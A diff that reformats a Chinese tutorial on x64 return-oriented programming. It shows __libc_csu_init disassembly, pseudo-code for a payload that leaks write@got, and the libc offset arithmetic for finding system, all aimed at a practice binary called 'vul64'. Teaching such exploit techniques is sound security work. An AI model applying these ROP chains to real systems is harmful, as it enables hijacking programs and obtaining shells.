@@ -77,7 +77,7 @@ x64中最常用ROP的是属于`__libc_csu_init`，但是由于它能控制的参
 
 首先获取内存地址，根据偏移来计算`system`的地址和`/bin/sh`的地址，由于使用ROPgadget并没有搜索到满足我们需求的`ROP`，但是在libc.so中，__libc_csu_init中提供了很有效的ROP链,使用`objdump -d -M intel vul64`查看关于`__libc_csu_init`
 
-0000000000400590 <__libc_csu_init>:
+<pre>0000000000400590 <__libc_csu_init>:
   400590:   41 57                   push   r15 
   400592:   41 56                   push   r14 
   400594:   49 89 d7                mov    r15,rdx
@@ -111,20 +111,18 @@ x64中最常用ROP的是属于`__libc_csu_init`，但是由于它能控制的参
   4005ee:   41 5d                   pop    r13 		# arg1
   4005f0:   41 5e                   pop    r14 		# arg2
   4005f2:   41 5f                   pop    r15 		# arg3
-  4005f4:   c3                      ret        
+  4005f4:   c3                      ret</pre>       
 
 可以看到从`0x4005ea`开始，就依次将栈上的数据弹入到`rbx`, `rbp`, `r12`, `r13`, `r14`, `r15`中，在`0x4005d0`，又将`r15`传递给`rdx`(函数的第三个参数)，`r14`传递给`rsi`(函数的第二个参数)，`r13`传递给`edi`(函数的第1个参数)，随后通过`call   QWORD PTR [r12+rbx*8]`来调用函数，`r12`和`rbx`我们也是可以控制。后续会判断rbp，rbx是否相等，如果相等就会继续执行下面的`pop`并且`ret`就可以执行另外一个函数。 这样`libc.so`提供的`ROP`完全满足我们的需求，只是构造会比较麻烦一点。该库是在所有的`elf64`的程序里面都会加载的.
 
 通过上面的信息作为基础，我们先构造`payload1`功能主要是调用`write`函数，并将`1(STDOUT_FILENO)`,`write@got`,`8(len)`3个参数进行传递获取到内存中write函数的地址
-
-    payload1 = "\x90"*payload_len + (return_addr=__libc_csu_init+5a=0x4005ea) + (rbx=0) + (rbp=1)
-    payload1 += (r12=write_got) + (r13=1) + (r14=write_got) + (r15=8) + (0x4005d0)	# write函数的调用
-    payload1 += "b"*56 + (return_addr=main) # 当write函数调用结束后，会继续pop6次，所以返回地址设置到程序的主函数进行payload2发送
+<pre>payload1 = "\x90"*payload_len + (return_addr=__libc_csu_init+5a=0x4005ea) + (rbx=0) + (rbp=1)
+payload1 += (r12=write_got) + (r13=1) + (r14=write_got) + (r15=8) + (0x4005d0)	# write函数的调用
+payload1 += "b"*56 + (return_addr=main) # 当write函数调用结束后，会继续pop6次，所以返回地址设置到程序的主函数进行payload2发送</pre>
 
 获取到`write_addr`的内存地址后，通过偏移开始计算`system`的偏移地址，由于通过`__libc_csu_init`的ROP我们控制的第一个参数只能保存在`edi`，`32`位的空间所以无法直接使用`libc.so`中的`/bin/sh`的内存地址因为它是64位的,所以这里还要再加一层`payload`，通过`read`函数将`/bin/sh`写入到`.bss`段中(因为地址位数比较小，所以可以通过edi来传递)。
-
-    write_addr = u64(p.recv(8))
-    system_addr = write_addr - (libc.symbols['write'] - libc.symbols['system'])
+<pre>write_addr = u64(p.recv(8))
+system_addr = write_addr - (libc.symbols['write'] - libc.symbols['system'])</pre>
 
 在获取到`system`地址后，我们需要通过`read`函数将`/bin/sh`写入到程序的`.bss`段中，这样方便我们将该地址传入到`edi`，调用`system`函数拿到`shell`.这个具体的构造可以参照[蒸米的这篇文章](http://cb.drops.wiki/drops/papers-7551.html)来进行操作
 
